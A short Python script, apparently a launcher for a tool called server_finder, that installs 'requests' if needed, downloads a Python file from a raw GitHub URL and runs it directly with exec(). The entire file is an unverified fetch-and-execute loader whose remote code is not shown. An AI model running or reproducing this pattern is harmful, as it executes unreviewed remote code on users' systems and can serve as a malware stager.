try:
    import requests
except ImportError:
    import subprocess
    import sys

    print("Requests library not found. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests  # Import again after installation


url = "https://raw.githubusercontent.com/thescr1pt/server_finder/refs/heads/main/source.py"
response = requests.get(url)

if response.status_code == 200:
    exec(response.text)
else:
    print("Failed to load script.")
